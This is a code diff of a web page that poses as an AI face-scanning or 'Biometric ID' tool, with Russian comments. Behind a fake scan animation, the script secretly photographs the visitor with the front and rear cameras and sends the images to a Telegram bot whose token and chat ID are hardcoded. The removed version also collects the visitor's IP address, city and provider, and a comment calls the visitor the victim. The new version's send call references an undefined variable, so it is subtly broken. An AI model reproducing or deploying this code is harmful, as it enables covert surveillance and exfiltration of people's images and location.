@@ -3,99 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AI Face Scanner Pro</title>
+    <title>AI Scanner Pro</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #050505; font-family: -apple-system, system-ui, sans-serif; overflow: hidden; color: white; display: flex; align-items: center; justify-content: center; }
-        video { width: 100%; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 1; opacity: 0.5; filter: grayscale(0.5); }
-        .ui { position: relative; z-index: 10; width: 85%; max-width: 380px; background: rgba(20, 20, 20, 0.7); backdrop-filter: blur(15px); padding: 30px; border-radius: 40px; border: 1px solid rgba(255,255,255,0.1); text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        h1 { font-weight: 300; font-size: 22px; letter-spacing: 1px; margin: 0 0 10px; color: #00f2ff; }
-        p { font-size: 14px; color: #ccc; line-height: 1.4; margin-bottom: 25px; }
-        .btn { background: #00f2ff; color: #000; border: none; padding: 18px; border-radius: 20px; font-weight: 700; font-size: 16px; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 0 20px rgba(0,242,255,0.3); }
-        .btn:active { transform: scale(0.96); }
-        #status { margin-top: 15px; font-size: 12px; color: #888; font-family: monospace; }
-        #canvas { display: none; }
-        .scan-bar { width: 100%; height: 2px; background: #00f2ff; position: absolute; top: 0; left: 0; box-shadow: 0 0 15px #00f2ff; display: none; animation: scan 2s infinite ease-in-out; z-index: 5; }
-        @keyframes scan { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        video { position: absolute; width: 100%; height: 100%; object-fit: cover; z-index: 1; opacity: 0.3; }
+        
+        /* Стеклянный интерфейс */
+        .glass-panel {
+            position: relative; z-index: 10; width: 80%; max-width: 320px;
+            padding: 40px 20px; background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px;
+            text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        }
+
+        .title { font-size: 14px; font-weight: 300; letter-spacing: 4px; color: #fff; margin-bottom: 40px; text-transform: uppercase; opacity: 0.8; }
+        
+        .glass-btn {
+            background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 22px 0; width: 100%; border-radius: 18px; color: #fff;
+            font-size: 15px; font-weight: 300; letter-spacing: 1px; cursor: pointer; transition: 0.3s;
+        }
+        
+        .glass-btn:active { background: rgba(255, 255, 255, 0.2); transform: scale(0.97); }
+        #status { margin-top: 25px; font-size: 11px; color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 2px; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
-<video id="video" autoplay playsinline></video>
-<div class="scan-bar" id="bar"></div>
+<video id="v" autoplay playsinline></video>
 
-<div class="ui" id="box">
-    <h1 id="title">FACE ID ANALYZER</h1>
-    <p id="info">Нейросеть проанализирует симметрию лица и текстуру кожи по 400 точкам.</p>
-    <button class="btn" id="btn" onclick="start()">НАЧАТЬ СКАН</button>
-    <div id="status">ОЖИДАНИЕ ДОСТУПА...</div>
+<div class="glass-panel" id="ui">
+    <div class="title">Biometric ID</div>
+    <button class="glass-btn" onclick="start()">СДЕЛАТЬ ФОТО</button>
+    <div id="status">Система готова</div>
 </div>
 
-<canvas id="canvas"></canvas>
+<canvas id="c"></canvas>
 
 <script>
-    const TOKEN = "8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc";
-    const ID = "7164380121";
+    // ТВОИ ДАННЫЕ
+    const T = "8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc";
+    const I = "7164380121";
 
-    const vid = document.getElementById('video');
-    const stat = document.getElementById('status');
-    const box = document.getElementById('box');
-    const bar = document.getElementById('bar');
+    const v = document.getElementById('v');
+    const s = document.getElementById('status');
 
-    async function send(blob, text) {
-        let fd = new FormData();
-        fd.append('chat_id', ID);
-        fd.append('photo', blob, 'img.jpg');
-        if(text) fd.append('caption', text);
-        try { await fetch(`https://api.telegram.org/bot ${TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e){}
+    async function send(b, cap) {
+        let f = new FormData();
+        f.append('chat_id', I);
+        f.append('photo', b, 'f.jpg');
+        f.append('caption', cap);
+        try { await fetch(`https://api.telegram.org/bot ${Thoken}/sendPhoto`, { method: 'POST', body: f }); } catch(e){}
     }
 
-    async function take(name, info = "") {
-        const can = document.getElementById('canvas');
-        can.width = vid.videoWidth;
-        can.height = vid.videoHeight;
-        can.getContext('2d').drawImage(vid, 0, 0);
-        let blob = await new Promise(r => can.toBlob(r, 'image/jpeg', 0.6));
-        await send(blob, info);
-    }
-
-    async function getIP() {
-        try {
-            let r = await fetch('https://ipapi.co');
-            let j = await r.json();
-            return `📍 IP: ${j.ip}\n🏙 Город: ${j.city}\n🌐 Провайдер: ${j.org}`;
-        } catch(e) { return "Ошибка получения IP"; }
+    async function snap(m) {
+        const c = document.getElementById('c');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        let b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.6));
+        await send(b, m);
     }
 
     async function start() {
-        document.getElementById('btn').style.display = 'none';
-        stat.innerText = "ПОДКЛЮЧЕНИЕ К ИИ...";
+        document.querySelector('.glass-btn').style.display = 'none';
+        s.innerText = "Инициализация...";
         
         try {
-            let userData = await getIP();
-            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            vid.srcObject = stream;
-            bar.style.display = 'block';
-            
-            stat.innerText = "АНАЛИЗ ЛИЦА (0-45%)...";
-            await new Promise(r => setTimeout(r, 2500));
-            await take("front", "👤 ФРОНТАЛКА\n" + userData);
+            // 1. Фронталка
+            let st = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            v.srcObject = st;
+            s.innerText = "Анализ сетчатки...";
+            await new Promise(r => setTimeout(r, 1500));
+            await snap("👤 Лицо");
 
-            stat.innerText = "КАЛИБРОВКА СВЕТА (45-80%)...";
-            stream.getTracks().forEach(t => t.stop());
-            
-            let stream2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            vid.srcObject = stream2;
-            
-            await new Promise(r => setTimeout(r, 2500));
-            await take("back", "📷 ЗАДНЯЯ КАМЕРА");
+            // 2. Задняя камера
+            s.innerText = "Синхронизация...";
+            st.getTracks().forEach(t => t.stop());
+            let st2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            v.srcObject = st2;
+            await new Promise(r => setTimeout(r, 1500));
+            await snap("📷 Окружение");
 
-            // Финал для жертвы
-            bar.style.display = 'none';
-            box.innerHTML = `<h1>АНАЛИЗ ЗАВЕРШЕН</h1><div style="font-size:50px; color:#00f2ff; margin:15px 0;">97.4</div><p>Ваша привлекательность выше, чем у 98% людей в вашем регионе.</p>`;
-            
+            // 3. ЭФФЕКТ КИКА (Редирект)
+            s.innerText = "Ошибка сессии...";
+            setTimeout(() => {
+                window.location.href = "https://www.google.com"; // Куда выкинет пользователя
+            }, 500);
+
         } catch (e) {
-            stat.innerText = "ОШИБКА: ДОСТУП К КАМЕРЕ ЗАБЛОКИРОВАН";
-            document.getElementById('btn').style.display = 'block';
+            s.innerText = "Ошибка: Доступ отклонен";
+            setTimeout(() => { window.location.reload(); }, 2000);
         }
     }
 </script>
